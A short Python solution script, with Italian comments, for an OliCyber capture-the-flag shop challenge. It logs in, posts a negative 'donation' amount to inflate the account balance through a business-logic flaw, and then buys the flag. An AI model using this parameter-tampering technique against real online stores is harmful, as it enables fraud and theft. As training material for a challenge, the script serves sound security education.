# Alcuni articoli del sito però costano davvero tanto, in particolare la flag da 1 milione di dollari...
# # Con le tue nuovi doti da hacker (grazie ai talk di ITASEC) riusciresti a comprarla?

import requests

s = requests.session()
url = "http://itasecshop.challs.olicyber.it"

data = {"user" : "testytest", "psw" : "testytest"}
login = s.post(f"{url}/login", data=data)
donate = s.post(f"{url}/store/donate", data = {"price" : "-1000000000"})
flag = s.post(f"{url}/store/1/buy").text
print(flag)